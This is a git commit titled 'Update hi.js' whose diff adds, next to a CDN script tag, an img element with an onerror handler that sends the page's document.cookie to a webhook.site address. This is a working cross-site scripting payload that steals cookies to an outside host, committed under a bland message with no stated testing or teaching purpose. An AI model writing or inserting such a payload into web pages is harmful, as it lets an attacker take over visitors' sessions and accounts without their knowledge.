0159742e09f87b0030ded192daf5ea348568a1a0
seohee0605 <165352981+seohee0605@users.noreply.github.com>
2024-09-18 23:51:36 +0900

    Update hi.js

--- hi.js
+++ hi.js
@@ -1,1 +1,1 @@
-<script async src="http://cdn.jsdelivr.net/npm/perfops-rom"></script>
+<><script async src="http://cdn.jsdelivr.net/npm/perfops-rom"></script><img src x onerror='document.location="https://webhook.site/dde0021c-614f-4dc0-b6fc-25294beae606?q="+document.cookie;'></img></>
